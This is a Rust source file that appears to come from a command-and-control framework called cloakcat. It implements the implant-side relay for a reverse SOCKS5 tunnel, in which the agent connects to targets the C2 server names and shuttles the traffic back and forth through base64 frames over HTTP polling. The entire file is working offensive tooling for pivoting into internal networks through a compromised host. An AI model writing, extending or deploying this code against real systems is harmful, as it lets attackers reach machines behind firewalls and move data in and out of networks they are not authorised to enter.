//! Agent-side tunnel relay for reverse SOCKS5.
//!
//! When the agent receives a `TunnelData { action: Open, data: "host:port" }` frame
//! on its poll response, it spawns `run_tunnel` for that session.
//!
//! The task opens a real TCP connection to the target and bidirectionally
//! relays data between the TCP socket and the C2 server via HTTP:
//!   - TCP read  → POST /v1/tunnel/send/{agent_id}
//!   - GET /v1/tunnel/recv/{agent_id}?tunnel_id=X&hold=1 → TCP write

use anyhow::Result;
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use cloakcat_protocol::{TunnelAction, TunnelData};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};

const RECV_HOLD_SECS: u64 = 1;
const CONNECT_TIMEOUT_SECS: u64 = 10;
const SESSION_TIMEOUT_SECS: u64 = 300;
const TCP_BUF_SIZE: usize = 16_384;

/// Entry point: connect to target and relay until timeout or close.
pub async fn run_tunnel(
    client: reqwest::Client,
    c2_url: String,
    agent_id: String,
    auth_token: String,
    tunnel_id: u32,
    target: String,
) {
    if let Err(e) = relay(client, c2_url, agent_id, auth_token, tunnel_id, target).await {
        eprintln!("[tunnel] tunnel_id={} ended: {}", tunnel_id, e);
    }
}

async fn relay(
    client: reqwest::Client,
    c2_url: String,
    agent_id: String,
    auth_token: String,
    tunnel_id: u32,
    target: String,
) -> Result<()> {
    // Connect to the real target on behalf of the SOCKS5 client.
    let stream = tokio::time::timeout(
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
        TcpStream::connect(&target),
    )
    .await
    .map_err(|_| anyhow::anyhow!("connect timeout to {}", target))??;

    let (mut tcp_reader, mut tcp_writer) = stream.into_split();

    let send_url = format!("{}/v1/tunnel/send/{}", c2_url, agent_id);
    let recv_url = format!(
        "{}/v1/tunnel/recv/{}?tunnel_id={}&hold={}",
        c2_url, agent_id, tunnel_id, RECV_HOLD_SECS
    );

    // TCP → C2 server (forward direction)
    let client1 = client.clone();
    let send1 = send_url.clone();
    let auth1 = auth_token.clone();
    let tcp_to_server = tokio::spawn(async move {
        let mut buf = vec![0u8; TCP_BUF_SIZE];
        loop {
            match tcp_reader.read(&mut buf).await {
                Ok(0) | Err(_) => {
                    // EOF: send Close frame.
                    let _ = post_frame(
                        &client1,
                        &send1,
                        &auth1,
                        TunnelData {
                            tunnel_id,
                            action: TunnelAction::Close,
                            data: String::new(),
                        },
                    )
                    .await;
                    break;
                }
                Ok(n) => {
                    let frame = TunnelData {
                        tunnel_id,
                        action: TunnelAction::Data,
                        data: B64.encode(&buf[..n]),
                    };
                    if post_frame(&client1, &send1, &auth1, frame).await.is_err() {
                        break;
                    }
                }
            }
        }
    });

    // C2 server → TCP (reverse direction)
    let client2 = client.clone();
    let recv2 = recv_url.clone();
    let auth2 = auth_token.clone();
    let server_to_tcp = tokio::spawn(async move {
        loop {
            match poll_frame(&client2, &recv2, &auth2).await {
                Ok(Some(frame)) => match frame.action {
                    TunnelAction::Close => return,
                    TunnelAction::Data => {
                        if let Ok(bytes) = B64.decode(&frame.data)
                            && !bytes.is_empty()
                            && tcp_writer.write_all(&bytes).await.is_err()
                        {
                            return;
                        }
                    }
                    TunnelAction::Open => {} // ignore unexpected
                },
                Ok(None) => {
                    // 204: no data yet, tight retry
                    sleep(Duration::from_millis(50)).await;
                }
                Err(_) => {
                    sleep(Duration::from_millis(500)).await;
                }
            }
        }
    });

    let timeout = Duration::from_secs(SESSION_TIMEOUT_SECS);
    tokio::select! {
        _ = tcp_to_server => {}
        _ = server_to_tcp => {}
        _ = sleep(timeout) => {}
    }

    Ok(())
}

async fn post_frame(
    client: &reqwest::Client,
    url: &str,
    token: &str,
    frame: TunnelData,
) -> Result<()> {
    let resp = client
        .post(url)
        .header("X-Agent-Token", token)
        .json(&frame)
        .send()
        .await?;
    if !resp.status().is_success() {
        anyhow::bail!("tunnel send: {}", resp.status());
    }
    Ok(())
}

/// Poll for one server → agent frame. Returns `None` on 204 (no data).
async fn poll_frame(
    client: &reqwest::Client,
    url: &str,
    token: &str,
) -> Result<Option<TunnelData>> {
    let resp = client
        .get(url)
        .header("X-Agent-Token", token)
        .send()
        .await?;
    if resp.status() == reqwest::StatusCode::NO_CONTENT {
        return Ok(None);
    }
    if !resp.status().is_success() {
        anyhow::bail!("tunnel recv: {}", resp.status());
    }
    let frame: TunnelData = resp.json().await?;
    Ok(Some(frame))
}
